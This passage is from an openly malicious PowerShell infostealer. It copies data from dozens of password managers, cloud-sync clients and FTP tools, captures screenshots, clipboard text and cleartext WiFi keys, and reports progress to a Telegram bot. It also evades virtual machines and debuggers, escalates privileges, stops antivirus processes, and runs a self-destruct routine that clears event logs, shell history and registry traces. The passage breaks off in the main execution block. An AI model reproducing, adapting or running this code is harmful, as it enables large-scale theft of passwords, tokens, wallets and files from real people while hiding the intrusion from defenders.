    # Browser-based password managers (extensions)
    $browserPasswordManagers = @{
        "LastPass_Chrome"       = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\hdokiejnpimakedhajhdlcegeplioahd"
        "LastPass_Edge"         = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\hdokiejnpimakedhajhdlcegeplioahd"
        "1Password_Chrome"      = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\aeblfdkhhhdcdjpifhhbdiojplfjncoa"
        "1Password_Edge"        = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\aeblfdkhhhdcdjpifhhbdiojplfjncoa"
        "Bitwarden_Chrome"      = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\nngceckbapebfimnlniiiahkandclblb"
        "Bitwarden_Edge"        = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\nngceckbapebfimnlniiiahkandclblb"
        "Dashlane_Chrome"       = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\fdjamakpfbbddfjaooikfcpapjohcfmg"
        "Dashlane_Edge"         = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\fdjamakpfbbddfjaooikfcpapjohcfmg"
        "Keeper_Chrome"         = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\bfogiafebfohioclikplaceofgfllgoh"
        "Keeper_Edge"           = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\bfogiafebfohioclikplaceofgfllgoh"
        "NordPass_Chrome"       = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\fooolghllnmhmmndgjiamiiodkpenpbb"
        "NordPass_Edge"         = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\fooolghllnmhmmndgjiamiiodkpenpbb"
        "RoboForm_Chrome"       = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\pnlccmojcmeohlpggmfnbbiapkmbliob"
        "RoboForm_Edge"         = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\pnlccmojcmeohlpggmfnbbiapkmbliob"
    }
    
    # Desktop password managers
    $desktopPasswordManagers = @{
        "LastPass"              = "$env:LOCALAPPDATA\LastPass"
        "1Password"             = "$env:APPDATA\1Password"
        "1Password4"            = "$env:LOCALAPPDATA\1password"
        "1Password7"            = "$env:LOCALAPPDATA\1Password\1Password.exe"
        "Bitwarden"             = "$env:APPDATA\Bitwarden"
        "Dashlane"              = "$env:APPDATA\Dashlane"
        "DashlaneBusinessApp"   = "$env:LOCALAPPDATA\Dashlane\Dashlane Business"
        "KeePass"               = "$env:APPDATA\KeePass"
        "KeePassX"              = "$env:APPDATA\keepassx"
        "KeePassXC"             = "$env:APPDATA\keepassxc"
        "Keeper"                = "$env:APPDATA\Keeper Security Inc"
        "NordPass"              = "$env:APPDATA\NordPass"
        "RoboForm"              = "$env:APPDATA\Siber Systems\AI RoboForm"
        "RoboForm8"             = "$env:LOCALAPPDATA\RoboForm"
        "PasswordSafe"          = "$env:APPDATA\Password Safe"
        "Sticky_Password"       = "$env:APPDATA\Sticky Password"
        "True_Key"              = "$env:APPDATA\Intel Security\True Key"
        "Zoho_Vault"            = "$env:APPDATA\Zoho\Vault"
        "Enpass"                = "$env:APPDATA\Enpass"
        "Enpass6"               = "$env:LOCALAPPDATA\Enpass"
        "F-Secure_KEY"          = "$env:APPDATA\F-Secure\F-Secure KEY"
        "Kaspersky_Password"    = "$env:APPDATA\Kaspersky Lab\Kaspersky Password Manager"
        "Norton_Identity"       = "$env:APPDATA\Norton\Norton Identity Safe"
        "Trend_Micro"           = "$env:APPDATA\Trend Micro\Password Manager"
        "Avira_Password"        = "$env:APPDATA\Avira\Avira Password Manager"
        "TeamViewer_Password"   = "$env:APPDATA\TeamViewer\PasswordManager"
        "Buttercup"             = "$env:APPDATA\Buttercup"
        "AuthPass"              = "$env:APPDATA\AuthPass"
        "SafeInCloud"           = "$env:LOCALAPPDATA\SafeInCloud"
        "Myki"                  = "$env:APPDATA\Myki"
        "Cyclonis"              = "$env:APPDATA\Cyclonis"
        "Password_Depot"        = "$env:APPDATA\AceBIT\Password Depot"
        "Secrets_for_macOS"     = "$env:APPDATA\Secrets"
        "MultiPassword"         = "$env:APPDATA\MultiPassword"
        "Padlock"               = "$env:APPDATA\Padlock"
        "Pleasant_Password"     = "$env:APPDATA\Pleasant Solutions\Pleasant Password Server"
        "Mango_Password"        = "$env:APPDATA\Mango\Mango Password"
        "SplashID"              = "$env:APPDATA\SplashData\SplashID Safe"
        "eWallet"               = "$env:APPDATA\Ilium Software\eWallet"
        "DataVault"             = "$env:APPDATA\Ascendo\DataVault"
        "Keychain_Access"       = "$env:APPDATA\Keychain Access"
        "KWalletManager"        = "$env:APPDATA\KDE\share\apps\kwallet"
        "Password_Gorilla"      = "$env:APPDATA\Password Gorilla"
    }
    
    $passwordManagerFound = $false
    
    # Extract browser-based password managers
    Write-DebugLog "Scanning browser password manager extensions..."
    foreach($pm in $browserPasswordManagers.GetEnumerator()) {
        if(Test-Path $pm.Value) {
            $passwordManagerFound = $true
            $dest = Join-Path $OutDir "PasswordManagers\Browser\$($pm.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $pm.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied browser password manager: $($pm.Name) from $($pm.Value)"
                
                # Also copy local storage and session storage
                $parentDir = Split-Path $pm.Value -Parent
                $localStorage = Join-Path $parentDir "Local Storage"
                $sessionStorage = Join-Path $parentDir "Session Storage"
                
                if(Test-Path $localStorage) {
                    Copy-Item $localStorage (Join-Path $dest "Local Storage") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Local Storage for $($pm.Name)"
                }
                if(Test-Path $sessionStorage) {
                    Copy-Item $sessionStorage (Join-Path $dest "Session Storage") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Session Storage for $($pm.Name)"
                }
            } catch {
                Write-DebugLog "Failed to copy browser password manager $($pm.Name): $($_.Exception.Message)"
            }
        }
    }
    
    # Extract desktop password managers
    Write-DebugLog "Scanning desktop password managers..."
    foreach($pm in $desktopPasswordManagers.GetEnumerator()) {
        if(Test-Path $pm.Value) {
            $passwordManagerFound = $true
            $dest = Join-Path $OutDir "PasswordManagers\Desktop\$($pm.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $pm.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied desktop password manager: $($pm.Name) from $($pm.Value)"
            } catch {
                Write-DebugLog "Failed to copy desktop password manager $($pm.Name): $($_.Exception.Message)"
            }
        }
    }
    
    # Search for password database files
    Write-DebugLog "Searching for password database files..."
    $passwordSearchPaths = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads"
    )
    
    $passwordFilePatterns = @(
        "*.kdbx",
        "*.kdb", 
        "*.psafe3",
        "*.1pif",
        "*.agilekeychain",
        "*.opvault",
        "*.dashlane",
        "*.lpd",
        "*.csv",
        "*password*",
        "*login*"
    )
    
    foreach($searchPath in $passwordSearchPaths) {
        if(Test-Path $searchPath) {
            foreach($pattern in $passwordFilePatterns) {
                try {
                    $foundFiles = Get-ChildItem $searchPath -Filter $pattern -Recurse -ErrorAction SilentlyContinue
                    if($foundFiles) {
                        $passwordManagerFound = $true
                        foreach($file in $foundFiles) {
                            $dest = Join-Path $OutDir "PasswordManagers\FoundFiles\$(Split-Path $searchPath -Leaf)"
                            New-Item -ItemType Directory -Path $dest -Force | Out-Null
                            Copy-Item $file.FullName $dest -Force -ErrorAction SilentlyContinue
                            Write-DebugLog "Found password file: $($file.Name) in $searchPath"
                        }
                    }
                } catch {
                    Write-DebugLog "Error searching for password files in $searchPath`: $($_.Exception.Message)"
                }
            }
        }
    }
    
    # Check for running password manager processes
    try {
        $passwordProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "lastpass|1password|bitwarden|dashlane|keepass|keeper|nordpass|roboform|passwordsafe|sticky|truekey|zoho|enpass|fsecure|kaspersky|norton|trend|avira|teamviewer"} -ErrorAction SilentlyContinue)
        if($passwordProcesses -and $passwordProcesses.Count -gt 0) {
            $passwordManagerFound = $true
            $processInfo = $passwordProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "PasswordManagers\RunningPasswordProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running password manager processes: $($passwordProcesses.Count)"
        }
    } catch {
        Write-DebugLog "Password manager process check failed: $($_.Exception.Message)"
    }
    
    if(-not $passwordManagerFound) {
        Write-DebugLog "No password manager data found"
    }
    Write-DebugLog "Comprehensive password manager extraction completed"
}

function Invoke-CloudSteal($OutDir){
    Write-DebugLog "Starting comprehensive cloud service extraction..."
    
    # Major cloud storage services
    $cloudServices = @{
        "Dropbox"           = "$env:APPDATA\Dropbox"
        "GoogleDrive"       = "$env:APPDATA\Google\DriveFS"
        "GoogleDrive_Old"   = "$env:LOCALAPPDATA\Google\Drive"
        "OneDrive"          = "$env:LOCALAPPDATA\Microsoft\OneDrive"
        "OneDrive_Business" = "$env:LOCALAPPDATA\Microsoft\OneDrive - *"
        "iCloudDrive"       = "$env:USERPROFILE\iCloudDrive"
        "iCloud"            = "$env:APPDATA\Apple Computer\MobileSync"
        "Box"               = "$env:LOCALAPPDATA\Box\Box"
        "BoxSync"           = "$env:APPDATA\Box Sync"
        "Sync"              = "$env:APPDATA\Sync"
        "pCloud"            = "$env:APPDATA\pCloud Drive"
        "MEGA"              = "$env:LOCALAPPDATA\Mega Limited"
        "Amazon_Drive"      = "$env:LOCALAPPDATA\Amazon Drive"
        "Nextcloud"         = "$env:APPDATA\Nextcloud"
        "ownCloud"          = "$env:APPDATA\ownCloud"
        "SpiderOak"         = "$env:APPDATA\SpiderOak"
        "SugarSync"         = "$env:LOCALAPPDATA\SugarSync"
        "Carbonite"         = "$env:APPDATA\Carbonite"
        "CrashPlan"         = "$env:APPDATA\CrashPlan"
        "Backblaze"         = "$env:APPDATA\Backblaze"
        "IDrive"            = "$env:APPDATA\IDrive"
        "Tresorit"          = "$env:APPDATA\Tresorit"
        "SecureSafe"        = "$env:APPDATA\SecureSafe"
        "Yandex_Disk"       = "$env:APPDATA\Yandex\YandexDisk"
        "Baidu_NetDisk"     = "$env:APPDATA\baidu\BaiduNetdisk"
        "MediaFire"         = "$env:APPDATA\MediaFire Desktop"
        "4shared"           = "$env:APPDATA\4shared Desktop"
        "Degoo"             = "$env:APPDATA\Degoo"
        "Icedrive"          = "$env:APPDATA\Icedrive"
        "TeraBox"           = "$env:APPDATA\TeraBox"
        "Insync"            = "$env:APPDATA\Insync"
        "Resilio_Sync"      = "$env:APPDATA\Resilio Sync"
        "Syncthing"         = "$env:LOCALAPPDATA\Syncthing"
        "FreeFileSync"      = "$env:APPDATA\FreeFileSync"
        "GoodSync"          = "$env:APPDATA\GoodSync"
        "Allway_Sync"       = "$env:APPDATA\Allway Sync"
        "SyncBackPro"       = "$env:APPDATA\2BrightSparks\SyncBackPro"
        "DSynchronize"      = "$env:APPDATA\DSynchronize"
        "Beyond_Compare"    = "$env:APPDATA\Scooter Software\Beyond Compare 4"
        "WinSCP"            = "$env:APPDATA\WinSCP"
        "FileZilla"         = "$env:APPDATA\FileZilla"
        "CuteFTP"           = "$env:APPDATA\GlobalSCAPE\CuteFTP"
        "SmartFTP"          = "$env:APPDATA\SmartFTP"
        "FlashFXP"          = "$env:APPDATA\FlashFXP"
        "FTP_Explorer"      = "$env:APPDATA\FTPx"
        "Core_FTP"          = "$env:APPDATA\CoreFTP"
        "Directory_Opus"    = "$env:APPDATA\GPSoftware\Directory Opus"
        "FTP_Rush"          = "$env:APPDATA\FTPRush"
        "WebDrive"          = "$env:APPDATA\WebDrive"
        "NetDrive"          = "$env:APPDATA\NetDrive"
        "CloudMounter"      = "$env:APPDATA\CloudMounter"
        "rclone"            = "$env:APPDATA\rclone"
        "Cyberduck"         = "$env:APPDATA\Cyberduck"
        "Transmit_5"        = "$env:APPDATA\Panic Inc\Transmit 5"
        "S3_Browser"        = "$env:APPDATA\S3 Browser"
        "CloudBerry"        = "$env:APPDATA\CloudBerryLab"
        "Comet_Backup"      = "$env:APPDATA\Comet"
    }
    
    $cloudFound = $false
    
    # Extract cloud service data
    Write-DebugLog "Scanning cloud storage services..."
    foreach($cloud in $cloudServices.GetEnumerator()) {
        # Handle wildcard paths (like OneDrive Business)
        if($cloud.Value -like "*`**") {
            try {
                $basePath = $cloud.Value -replace "\*.*$", ""
                $parentPath = Split-Path $basePath -Parent
                if(Test-Path $parentPath) {
                    $matchingPaths = Get-ChildItem $parentPath -Directory | Where-Object {$_.Name -like ($cloud.Value -replace ".*\\", "")}
                    foreach($matchPath in $matchingPaths) {
                        $cloudFound = $true
                        $dest = Join-Path $OutDir "CloudServices\$($cloud.Name)\$($matchPath.Name)"
                        New-Item -ItemType Directory -Path $dest -Force | Out-Null
                        try {
                            Copy-Item $matchPath.FullName $dest -Recurse -Force -ErrorAction SilentlyContinue
                            Write-DebugLog "Copied $($cloud.Name) data from: $($matchPath.FullName)"
                        } catch {
                            Write-DebugLog "Failed to copy $($cloud.Name) data from $($matchPath.FullName): $($_.Exception.Message)"
                        }
                    }
                }
            } catch {
                Write-DebugLog "Failed to process wildcard path for $($cloud.Name): $($_.Exception.Message)"
            }
        } else {
            if(Test-Path $cloud.Value) {
                $cloudFound = $true
                $dest = Join-Path $OutDir "CloudServices\$($cloud.Name)"
                New-Item -ItemType Directory -Path $dest -Force | Out-Null
                try {
                    Copy-Item $cloud.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied $($cloud.Name) data from: $($cloud.Value)"
                } catch {
                    Write-DebugLog "Failed to copy $($cloud.Name) data from $($cloud.Value): $($_.Exception.Message)"
                }
            }
        }
    }
    
    # Search for cloud sync folders in common locations
    Write-DebugLog "Searching for cloud sync folders..."
    $cloudSearchPaths = @(
        "$env:USERPROFILE",
        "$env:USERPROFILE\Desktop"
    )
    
    $cloudFolderNames = @("Dropbox", "Google Drive", "OneDrive", "iCloudDrive", "Box Sync", "Sync", "pCloud Drive", "MEGA", "Amazon Drive", "Nextcloud", "ownCloud")
    
    foreach($searchPath in $cloudSearchPaths) {
        if(Test-Path $searchPath) {
            foreach($folderName in $cloudFolderNames) {
                $cloudFolder = Join-Path $searchPath $folderName
                if(Test-Path $cloudFolder) {
                    $cloudFound = $true
                    try {
                        # Only copy metadata, not all files (could be huge)
                        $dest = Join-Path $OutDir "CloudServices\SyncFolders\$folderName"
                        New-Item -ItemType Directory -Path $dest -Force | Out-Null
                        
                        # Get folder structure info instead of copying everything
                        $folderInfo = Get-ChildItem $cloudFolder -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime, Attributes
                        $folderInfo | Export-Csv (Join-Path $dest "FolderContents.csv") -NoTypeInformation
                        Write-DebugLog "Cataloged cloud sync folder: $folderName in $searchPath"
                    } catch {
                        Write-DebugLog "Error cataloging cloud folder $folderName in $searchPath`: $($_.Exception.Message)"
                    }
                }
            }
        }
    }
    
    # Check for running cloud service processes
    try {
        $cloudProcesses = Get-Process | Where-Object {$_.ProcessName -match "dropbox|googledrivesync|onedrive|icloud|box|sync|pcloud|mega|amazon|nextcloud|owncloud|spideroak|sugarsync|carbonite|crashplan|backblaze|idrive|tresorit|secure|yandex|baidu|mediafire|4shared|degoo|icedrive|tera"} -ErrorAction SilentlyContinue
        if($cloudProcesses) {
            $cloudFound = $true
            $processInfo = $cloudProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "CloudServices\RunningCloudProcesses.txt") -Encoding utf8
            $processCount = if($cloudProcesses -is [array]) { $cloudProcesses.Count } else { 1 }
            Write-DebugLog "Found running cloud service processes: $processCount"
        }
    } catch {
        Write-DebugLog "Cloud service process check failed: $($_.Exception.Message)"
    }
    
    # Extract cloud authentication tokens from registry
    try {
        Write-DebugLog "Extracting cloud authentication data from registry..."
        $registryPaths = @(
            "HKCU:\Software\Dropbox",
            "HKCU:\Software\Google\Drive",
            "HKCU:\Software\Microsoft\OneDrive",
            "HKCU:\Software\Apple Computer, Inc.\CloudDocs",
            "HKCU:\Software\Box\Box"
        )
        
        foreach($regPath in $registryPaths) {
            if(Test-Path $regPath) {
                $cloudFound = $true
                $serviceName = Split-Path $regPath -Leaf
                $regData = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
                if($regData) {
                    $regData | Out-File (Join-Path $OutDir "CloudServices\Registry_$serviceName.txt") -Encoding utf8
                    Write-DebugLog "Extracted registry data for $serviceName"
                }
            }
        }
    } catch {
        Write-DebugLog "Cloud registry extraction failed: $($_.Exception.Message)"
    }
    
    if(-not $cloudFound) {
        Write-DebugLog "No cloud service data found"
    }
    Write-DebugLog "Comprehensive cloud service extraction completed"
}

function Invoke-SystemRecon($OutDir){
    Write-DebugLog "Starting system reconnaissance..."
    try{
        # Screenshot
        Add-Type -AssemblyName System.Drawing,System.Windows.Forms -ErrorAction Stop
        $s=[Windows.Forms.SystemInformation]::VirtualScreen
        $b=New-Object Drawing.Bitmap $s.Width,$s.Height
        $g=[Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
        $b.Save((Join-Path $OutDir "System\Desktop.png"),[Drawing.Imaging.ImageFormat]::Png)
        $g.Dispose(); $b.Dispose()
        Write-DebugLog "Screenshot captured"
    }catch{
        Write-DebugLog "Screenshot failed: $($_.Exception.Message)"
    }
    
    try{
        # Clipboard
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $clip=[Windows.Forms.Clipboard]::GetText()
        if($clip){
            $clip|Out-File (Join-Path $OutDir "System\Clipboard.txt") -Encoding utf8
            Write-DebugLog "Clipboard captured"
        }
    }catch{
        Write-DebugLog "Clipboard capture failed: $($_.Exception.Message)"
    }
    
    try {
        # System information
        $ipInf=try{Invoke-RestMethod 'http://ip-api.com/json' -TimeoutSec 5}catch{@{query="N/A";countryCode="N/A"}}
        $os=Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cs=Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        $cpu=Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $disk=Get-CimInstance Win32_DiskDrive -ErrorAction SilentlyContinue
        $wifi=try{netsh wlan show profiles | ForEach-Object {if($_ -match ':\s*(.+)'){$p=$Matches[1].Trim();netsh wlan show profile name="`"$p`"" key=clear}}|Select-String "Key Content"}catch{"WiFi enumeration failed"}
        
        @"
ID: $T36R_UniqueId
IP: $($ipInf.query)
Country: $($ipInf.countryCode)
Host: $env:COMPUTERNAME
User: $env:USERNAME
Admin: $T36R_IsAdmin
OS: $($os.Caption) ($($os.OSArchitecture))
CPU: $($cpu.Name)
RAM: $([Math]::Round($cs.TotalPhysicalMemory/1GB,2)) GB
Disk: $($disk.Model) ($([Math]::Round($disk.Size/1GB,2)) GB)
WiFi Keys:
$($wifi|Out-String)
"@ | Out-File (Join-Path $OutDir "System\System_Report.txt") -Encoding utf8
        Write-DebugLog "System report generated"
        return $ipInf.query,$ipInf.countryCode
    } catch {
        Write-DebugLog "System reconnaissance failed: $($_.Exception.Message)"
        return "Unknown", "Unknown"
    }
}

function New-SimpleZip($SourceDir, $ZipPath) {
    Write-DebugLog "Creating zip archive..."
    try {
        # Use built-in compression
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
        [System.IO.Compression.ZipFile]::CreateFromDirectory($SourceDir, "$ZipPath.zip")
        
        # Check file size and split if necessary
        $zipFile = "$ZipPath.zip"
        $zipSize = (Get-Item $zipFile).Length
        $maxSize = 45MB # Stay under 50MB limit with buffer
        
        if($zipSize -gt $maxSize) {
            Write-DebugLog "Archive too large ($([Math]::Round($zipSize / 1MB, 2)) MB) - splitting into chunks"
            $chunks = Split-LargeFile -FilePath $zipFile -MaxChunkSize $maxSize
            Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
            Write-DebugLog "Created $($chunks.Count) chunks"
            return $chunks
        } else {
            Write-DebugLog "Zip archive created successfully: $zipFile ($([Math]::Round($zipSize / 1MB, 2)) MB)"
            return @($zipFile)
        }
    } catch {
        Write-DebugLog "Zip creation failed: $($_.Exception.Message)"
        return @()
    }
}

function Split-LargeFile {
    param(
        [string]$FilePath,
        [long]$MaxChunkSize
    )
    
    try {
        $file = Get-Item $FilePath
        $fileSize = $file.Length
        $chunkCount = [Math]::Ceiling($fileSize / $MaxChunkSize)
        $chunks = @()
        
        Write-DebugLog "Splitting $($file.Name) into $chunkCount chunks..."
        
        $reader = [System.IO.File]::OpenRead($FilePath)
        $buffer = New-Object byte[] $MaxChunkSize
        
        for($i = 0; $i -lt $chunkCount; $i++) {
            $chunkPath = "$($file.DirectoryName)\$($file.BaseName).part$($i + 1).zip"
            $writer = [System.IO.File]::Create($chunkPath)
            
            $bytesRead = $reader.Read($buffer, 0, $MaxChunkSize)
            $writer.Write($buffer, 0, $bytesRead)
            $writer.Close()
            
            $chunks += $chunkPath
            Write-DebugLog "Created chunk $($i + 1)/$chunkCount : $([Math]::Round((Get-Item $chunkPath).Length / 1MB, 2)) MB"
        }
        
        $reader.Close()
        return $chunks
        
    } catch {
        Write-DebugLog "File splitting failed: $($_.Exception.Message)"
        return @()
    }
}

function Invoke-Cleanup{
    Write-DebugLog "Starting basic cleanup..."
    try {
        if(Test-Path $T36R_TempDir){
            Remove-Item $T36R_TempDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        # Clean up zip files and chunks
        Remove-Item "$T36R_ZipPath*.zip" -Force -ErrorAction SilentlyContinue
        Remove-Item "$T36R_ZipPath*.part*.zip" -Force -ErrorAction SilentlyContinue
        Write-DebugLog "Basic cleanup completed"
    } catch {
        Write-DebugLog "Cleanup failed: $($_.Exception.Message)"
    }
}

function Test-TelegramConfig{
    Write-DebugLog "Testing Telegram configuration..."
    if(-not $T36R_TelegramBotToken -or -not $T36R_TelegramChatId -or
       $T36R_TelegramBotToken -eq "YOUR_TELEGRAM_BOT_TOKEN" -or
       $T36R_TelegramChatId -eq "YOUR_TELEGRAM_CHAT_ID" -or
       $T36R_TelegramBotToken -notmatch '^\d+:[A-Za-z0-9_-]+$'){
        throw "Invalid Telegram configuration"
    }
    Write-DebugLog "Telegram configuration validated"
}

function Invoke-SelfDestruct {
    Write-DebugLog "Initiating self-destruct sequence..."
    
    try {
        # Send final goodbye message
        Send-Telegram "💥 Mission complete - initiating self-destruct in 10 seconds..."
        Start-Sleep 3
        
        # Overwrite sensitive files with random data first
        Write-DebugLog "Securely wiping sensitive files..."
        $filesToWipe = @(
            $T36R_LogPath,
            $T36R_ScriptPath,
            "$env:TEMP\*.sqlite",
            "$env:TEMP\*.db",
            "$env:TEMP\exfil_*",
            "$T36R_TempDir\*"
        )
        
        foreach($pattern in $filesToWipe) {
            Get-ChildItem $pattern -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    # Overwrite with random data 3 times (DoD 5220.22-M standard)
                    $fileSize = $_.Length
                    if($fileSize -gt 0) {
                        for($pass = 1; $pass -le 3; $pass++) {
                            $randomData = New-Object byte[] $fileSize
                            (New-Object Random).NextBytes($randomData)
                            [System.IO.File]::WriteAllBytes($_.FullName, $randomData)
                        }
                        Write-DebugLog "Securely wiped: $($_.FullName)"
                    }
                } catch {
                    Write-DebugLog "Failed to wipe: $($_.FullName)"
                }
            }
        }
        
        # Clear Windows event logs
        Write-DebugLog "Clearing event logs..."
        $logs = @("Application", "System", "Security", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
        foreach($log in $logs) {
            try {
                wevtutil cl "$log" 2>$null
                Write-DebugLog "Cleared log: $log"
            } catch {
                Write-DebugLog "Failed to clear log: $log"
            }
        }
        
        # Clear PowerShell history
        Write-DebugLog "Clearing PowerShell history..."
        try {
            Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
            Clear-History -ErrorAction SilentlyContinue
            [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
        } catch {}
        
        # Clear temp files and caches
        Write-DebugLog "Clearing system traces..."
        $tempPaths = @(
            "$env:TEMP\*",
            "$env:LOCALAPPDATA\Temp\*",
            "$env:WINDIR\Temp\*",
            "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*",
            "$env:APPDATA\Microsoft\Windows\Recent\*"
        )
        
        foreach($tempPath in $tempPaths) {
            try {
                Get-ChildItem $tempPath -Force -ErrorAction SilentlyContinue | 
                Where-Object {$_.Name -match "exfil|sqlite|powershell|temp"} |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
        # Clear registry traces
        Write-DebugLog "Clearing registry traces..."
        try {
            # Clear recent file lists
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
            
            # Clear any UAC bypass registry entries we may have created
            Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item "HKCU:\Software\Classes\exefile" -Recurse -Force -ErrorAction SilentlyContinue
        } catch {}
        
        # Final message
        Send-Telegram "🔥 All traces destroyed - self-destructing now..."
        Write-DebugLog "Self-destruct sequence complete"
        
        # Create self-destruct batch file
        $batchScript = @'
@echo off
timeout /t 3 /nobreak >nul
taskkill /f /im powershell.exe >nul 2>&1
taskkill /f /im pwsh.exe >nul 2>&1
del /f /q "SCRIPT_PATH_PLACEHOLDER" >nul 2>&1
del /f /q "LOG_PATH_PLACEHOLDER" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
'@
        
        # Replace placeholders
        $batchScript = $batchScript.Replace("SCRIPT_PATH_PLACEHOLDER", $T36R_ScriptPath)
        $batchScript = $batchScript.Replace("LOG_PATH_PLACEHOLDER", $T36R_LogPath)
        
        $batchPath = "$env:TEMP\cleanup_$([System.Guid]::NewGuid().ToString('N').Substring(0,8)).bat"
        [System.IO.File]::WriteAllText($batchPath, $batchScript)
        
        # Launch self-destruct and exit immediately
        Start-Process -FilePath $batchPath -WindowStyle Hidden
        [Environment]::Exit(0)
        
    } catch {
        Write-DebugLog "Self-destruct failed: $($_.Exception.Message)"
        # Force exit anyway
        [Environment]::Exit(1)
    }
}

#region MAIN EXECUTION
$mutex = $null
try {
    # Initialize
    Test-TelegramConfig
    New-Item -ItemType Directory -Path $T36R_TempDir -Force | Out-Null
    New-Item -ItemType File -Path $T36R_DebugLog -Force | Out-Null
    
    Write-DebugLog "=== SCRIPT EXECUTION STARTED ==="
    Write-DebugLog "Computer: $env:COMPUTERNAME"
    Write-DebugLog "User: $env:USERNAME"
    Write-DebugLog "Admin: $T36R_IsAdmin"
    Write-DebugLog "Unique ID: $T36R_UniqueId"
    
    $startMessage = "🚀 Script started: *$env:USERNAME@$env:COMPUTERNAME* ($T36R_UniqueId)"
    Send-Telegram -Text $startMessage
    
    # Security checks
    Test-AntiVM
    
    # Mutex check
    Write-DebugLog "Creating execution mutex..."
    $mutex = New-Object Threading.Mutex($true, "T36R_OMEGA_MUTEX", [ref]$null)
    if(-not $mutex.WaitOne(0, $false)){
        Write-DebugLog "Another instance is running - exiting"
        Send-Telegram "❌ Another instance already running"
        exit
    }
    
    # Debugger check
    if([Win32]::IsDebuggerPresent()){
        Write-DebugLog "Debugger detected - exiting"
        Send-Telegram "🔍 Debugger detected - terminating"
        exit
    }
    # Privilege escalation and enablement
    Invoke-PrivilegeEscalation
    Enable-RequiredPrivileges | Out-Null
    
    # Setup
    Write-DebugLog "Setting up working directories..."
    New-Item -ItemType Directory -Path $T36R_OutputDir -Force | Out-Null
    
    # Create all target directories
    $directories = @("System", "Browsers", "Wallets", "DesktopWallets", "Social", "Games", "VPNs", "Emails", "PasswordManagers", "Clouds")
    foreach($dir in $directories) {
        New-Item -ItemType Directory -Path (Join-Path $T36R_OutputDir $dir) -Force | Out-Null
    }
    
    # Module registration
    Register-SQLiteModule | Out-Null
    
    # Process management
    if($T36R_IsAdmin) { Stop-AVProcesses }
    Invoke-KillProcesses
    
    # Comprehensive data collection
    Write-DebugLog "Starting comprehensive data collection phase..."
    $ip, $cc = Invoke-SystemRecon -OutDir $T36R_OutputDir
    Invoke-BrowserSteal -OutDir $T36R_OutputDir
    Invoke-WalletSteal -OutDir $T36R_OutputDir
    Invoke-DesktopWalletSteal -OutDir $T36R_OutputDir
    Invoke-SocialSteal -OutDir $T36R_OutputDir
    Invoke-GameSteal -OutDir $T36R_OutputDir
    Invoke-VPNSteal -OutDir $T36R_OutputDir
    Invoke-EmailSteal -OutDir $T36R_OutputDir
    Invoke-PasswordManagerSteal -OutDir $T36R_OutputDir
    Invoke-CloudSteal -OutDir $T36R_OutputDir
    
    # Check if any data was collected
    $collectedFiles = Get-ChildItem $T36R_OutputDir -Recurse -File -ErrorAction SilentlyContinue
    $totalSize = ($collectedFiles | Measure-Object -Property Length -Sum -ErrorAction SilentlyContinue).Sum
    $totalSizeMB = [Math]::Round($totalSize / 1MB, 2)
    
    Write-DebugLog "Data collection summary: $($collectedFiles.Count) files, $totalSizeMB MB"
    
    if($collectedFiles.Count -gt 0) {
        # Create archive
